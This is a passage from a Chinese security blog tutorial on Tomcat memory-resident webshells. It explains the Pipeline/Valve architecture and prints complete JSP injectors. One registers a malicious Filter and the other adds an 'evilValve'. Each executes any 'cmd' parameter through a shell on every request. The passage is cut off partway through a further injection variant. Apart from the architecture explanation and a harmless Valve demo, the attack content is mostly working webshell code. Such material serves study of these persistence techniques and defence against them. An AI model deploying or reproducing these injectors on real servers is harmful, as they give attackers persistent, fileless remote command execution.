servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br><span class="line">    <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> getRandomString();</span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(filterName) == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">httpServletRequest</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 修改为 macOS/Linux 兼容的命令执行方式</span></span><br><span class="line">                    String[] shellCmd = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(shellCmd).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    servletResponse.getWriter().println(output);</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilterName(filterName);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.setFilterName(filterName);</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">        filterConfigs.put(filterName, applicationFilterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Malicious filter injection successful!&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Filter name: &quot;</span> + filterName + <span class="string">&quot;&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Below is a list displaying filter names and their corresponding URL patterns:&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;tr&gt;&lt;th&gt;Filter Name&lt;/th&gt;&lt;th&gt;URL Patterns&lt;/th&gt;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">        List&lt;String[]&gt; allUrlPatterns = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Object filterConfigObj : filterConfigs.values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (filterConfigObj <span class="keyword">instanceof</span> ApplicationFilterConfig) &#123;</span><br><span class="line">                <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) filterConfigObj;</span><br><span class="line">                <span class="type">String</span> <span class="variable">filtername</span> <span class="operator">=</span> filterConfig.getFilterName();</span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterdef</span> <span class="operator">=</span> standardContext.findFilterDef(filtername);</span><br><span class="line">                <span class="keyword">if</span> (filterdef != <span class="literal">null</span>) &#123;</span><br><span class="line">                    FilterMap[] filterMaps = standardContext.findFilterMaps();</span><br><span class="line">                    <span class="keyword">for</span> (FilterMap filtermap : filterMaps) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (filtermap.getFilterName().equals(filtername)) &#123;</span><br><span class="line">                            String[] urlPatterns = filtermap.getURLPatterns();</span><br><span class="line">                            allUrlPatterns.add(urlPatterns);</span><br><span class="line">                            out.println(<span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span> + filtername + <span class="string">&quot;&lt;/td&gt;&quot;</span>);</span><br><span class="line">                            out.println(<span class="string">&quot;&lt;td&gt;&quot;</span> + String.join(<span class="string">&quot;, &quot;</span>, urlPatterns) + <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/table&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String[] urlPatterns : allUrlPatterns) &#123;</span><br><span class="line">            <span class="keyword">for</span> (String pattern : urlPatterns) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!pattern.equals(<span class="string">&quot;/*&quot;</span>)) &#123;</span><br><span class="line">                    out.println(<span class="string">&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;shell: http://localhost:8080/test&quot;</span> + pattern + <span class="string">&quot;?cmd=whoami&lt;br&gt;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getRandomString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">characters</span> <span class="operator">=</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">randomString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (<span class="type">int</span>) (Math.random() * characters.length());</span><br><span class="line">            randomString.append(characters.charAt(index));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> randomString.toString();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907162200007.png" alt="image-20250907162200007"></p><h2 id="Tomcat-Valve-容器内部组件"><a href="#Tomcat-Valve-容器内部组件" class="headerlink" title="Tomcat Valve 容器内部组件"></a>Tomcat Valve 容器内部组件</h2><p>这里我组合引用原文，做了适当的修改，概括一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tomcat中的Container有4种，分别是Engine、Host、Context和Wrapper，这4个Container的实现类分别是`StandardEngine`、`StandardHost`、`StandardContext`和`StandardWrapper`。4种容器的关系是包含关系，Engine包含Host，Host包含Context，Context包含Wrapper，Wrapper则代表最基础的一个Servlet。 tomcat由Connector和Container两部分组成，而当网络请求过来的时候Connector先将请求包装为Request，然后将Request交由Container进行处理，最终返回给请求方。而Container处理的第一层就是Engine容器，但是在tomcat中Engine容器不会直接调用Host容器去处理请求，那么请求是怎么在4个容器中流转的，4个容器之间是怎么依次调用的呢？</span><br><span class="line"></span><br><span class="line">原来，当请求到达Engine容器的时候，Engine并非是直接调用对应的Host去处理相关的请求，而是调用了自己的一个组件去处理，这个组件就叫做pipeline组件，跟pipeline相关的还有个也是容器内部的组件，叫做`valve`组件。</span><br><span class="line"></span><br><span class="line">Pipeline的作用就如其中文意思一样——管道，可以把不同容器想象成一个独立的个体，那么pipeline就可以理解为不同容器之间的管道，道路，桥梁。那Valve这个组件是什么东西呢？Valve也可以直接按照字面意思去理解为阀门。我们知道，在生活中可以看到每个管道上面都有阀门，Pipeline和Valve关系也是一样的。Valve代表管道上的阀门，可以控制管道的流向，当然每个管道上可以有多个阀门。如果把Pipeline比作公路的话，那么Valve可以理解为公路上的收费站，车代表Pipeline中的内容，那么每个收费站都会对其中的内容做一些处理（收费，查证件等）。</span><br><span class="line"></span><br><span class="line">在Catalina中，4种容器都有自己的Pipeline组件，每个Pipeline组件上至少会设定一个Valve，这个Valve我们称之为BaseValve，也就是基础阀。基础阀的作用是连接当前容器的下一个容器（通常是自己的自容器），可以说基础阀是两个容器之间的桥梁。</span><br><span class="line">Pipeline定义对应的接口Pipeline，标准实现了StandardPipeline。Valve定义对应的接口Valve，抽象实现类ValveBase，4个容器对应基础阀门分别是StandardEngineValve，StandardHostValve，StandardContextValve，StandardWrapperValve。在实际运行中，Pipeline和Valve运行机制如下图：</span><br><span class="line"></span><br><span class="line">这张图是新加坡的Dennis Jacob在ApacheCON Asia 2022上的演讲《Extending Valves in Tomcat》中的PPT中的图片，这篇演讲的录屏在[Youtube](https://www.youtube.com/watch?v=Jmw-d0kyZ_4)上面可以找到。</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/20250624155947-32819458-50d1-1.png" alt="img"></p><h2 id="编写一个简单-Tomcat-Valve-的-demo"><a href="#编写一个简单-Tomcat-Valve-的-demo" class="headerlink" title="编写一个简单 Tomcat Valve 的 demo"></a>编写一个简单 Tomcat Valve 的 demo</h2><ol><li>直接创建Spring的项目</li><li>然后创建test目录并在test目录下创建两个文件，TestValve.java：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.valves.ValveBase;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;Valve 被成功调用&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>还有TestConfig.java</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.Valve;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.server.WebServerFactoryCustomizer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> WebServerFactoryCustomizer&lt;TomcatServletWebServerFactory&gt; <span class="title function_">tomcatCustomizer</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> factory -&gt; &#123;</span><br><span class="line">            factory.addContextValves(getTestValve());</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Valve <span class="title function_">getTestValve</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TestValve</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907221429315.png" alt="image-20250907221429315"></p><h2 id="Tomcat-Valve-打入内存马思路分析"><a href="#Tomcat-Valve-打入内存马思路分析" class="headerlink" title="Tomcat Valve 打入内存马思路分析"></a>Tomcat Valve 打入内存马思路分析</h2><p>我们通常情况下用的都是ValveBase，从com.example.tomcatvalvedemo.TomcatDemo.TestValve进这个ValveBase，可以看到是实现了Valve接口：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907221619250.png" alt="image-20250907221619250"></p><p>点进valve可以看到该接口代码如下，这里我加上了注释：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.catalina;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Valve</span> &#123;</span><br><span class="line">    <span class="comment">// 获取下一个阀门</span></span><br><span class="line">    <span class="keyword">public</span> Valve <span class="title function_">getNext</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">// 设置下一个阀门</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNext</span><span class="params">(Valve valve)</span>;</span><br><span class="line">    <span class="comment">// 后台执行逻辑，主要在类加载上下文中使用到</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backgroundProcess</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">// 执行业务逻辑</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException;</span><br><span class="line">    <span class="comment">// 是否异步执行</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看向左下角，看看之前调用到的<code>invoke</code>方法：</p><p>在<code>StandardHostValve.java</code>中，代码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.getPipeline().getFirst().invoke(request, response);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907221938103.png" alt="image-20250907221938103"></p><p>在<code>StandardEngineValve.java</code>中，代码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host.getPipeline().getFirst().invoke(request, response);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907222043754.png" alt="image-20250907222043754"></p><p>之后的诸如<code>Http11Processor.java</code>和多线程的部分就不需要我们关注了。既然我们的目的是打入内存马，那根据我们掌握的<code>Tomcat Servlet/Filter/Listener</code>内存马的思路来看，我们需要通过某种方式添加我们自己的恶意<code>valve</code>。</p><p>我们去掉之前打的断点，在<code>StandardHostValve.java</code>这里打上断电并重新调试：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20240130154855309.png" alt="img"></p><p>然后<code>step into</code>：</p><p><a href="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130154950328.png"><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20240130154950328.png" alt="img"></a></p><p>鼠标左键单击这里的<code>getPipeline</code>即可进入到所调用的函数实现的位置：</p><p><a href="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130155044025.png"><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20240130155044025.png" alt="img"></a></p><p>再<code>Ctrl+H</code>进入<code>Pipeline</code>接口，可以看到是有个<code>addValve</code>方法：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907225309496.png" alt="image-20250907225309496"></p><p>这不正是我们需要的吗？我们去看看它是在哪儿实现的，直接在<code>addValve</code>函数处<code>Ctrl+H</code>找继承该接口的类，可可以看到是在<code>org.apache.catalina.core.StandardPipeline</code>中：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907225426956.png" alt="image-20250907225426956"></p><p>但是问题就来了，我们无法直接获取到这个<code>StandardPipeline</code>，而我们能直接获取到的是<code>StandardContext</code>，那就去看看<code>StandardContext.java</code>中有没有获取<code>StandardPipeline</code>的方法。</p><p>一眼就能看到我们的老熟人——<code>getPipeline</code>方法：</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20240130155825670.png" alt="img"></p><p>那这样以来我们的思路就可以补充完整了，先反射获取<code>StandardContext</code>，然后编写一个恶意<code>Valve</code>，最后通过<code>StandardContext.getPipeline().addValve()</code>添加就可以了。当然，我们也可以反射获取<code>StandardPipeline</code>，然后再<code>addValve</code>，这样也是可以的。</p><h2 id="Tomcat-Valve型内存马实现"><a href="#Tomcat-Valve型内存马实现" class="headerlink" title="Tomcat Valve型内存马实现"></a>Tomcat Valve型内存马实现</h2><p>我这里是新建了一个项目，并创建配置好了<code>web</code>目录和<code>tomcat</code>环境，<code>pom.xml</code>中的依赖如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;9.0.83&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies</span><br></pre></td></tr></table></figure><blockquote><p>如果idea启动tomcat报错，可以看看是不是你开了网易云哈哈哈：</p><p><a href="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130181221187.png"><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20240130181221187.png" alt="img"></a></p></blockquote><p>在<code>web</code>目录下新建一个<code>666.jsp</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">pipelineField</span> <span class="operator">=</span> ContainerBase.class.getDeclaredField(<span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line">    pipelineField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardPipeline</span> <span class="variable">evilStandardPipeline</span> <span class="operator">=</span> (StandardPipeline) pipelineField.get(standardContext);</span><br><span class="line">    <span class="type">ValveBase</span> <span class="variable">evilValve</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValveBase</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> ServletException,IOException &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                out.println(output);</span><br><span class="line">                out.flush();</span><br><span class="line">                out.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.getNext().invoke(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    evilStandardPipeline.addValve(evilValve);</span><br><span class="line">    out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>上面的这个是采用了从<code>StandardContext</code>反射获取<code>StandardPipeline</code>的方式，效果如下：</p><p><a href="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164016715.png"><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20240130164016715.png" alt="img"></a></p><p><a href="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130164029228.png"><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20240130164029228.png" alt="img"></a></p><p>下面的则是调用 <code>standardContext.getPipeline().addValve</code>实现的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 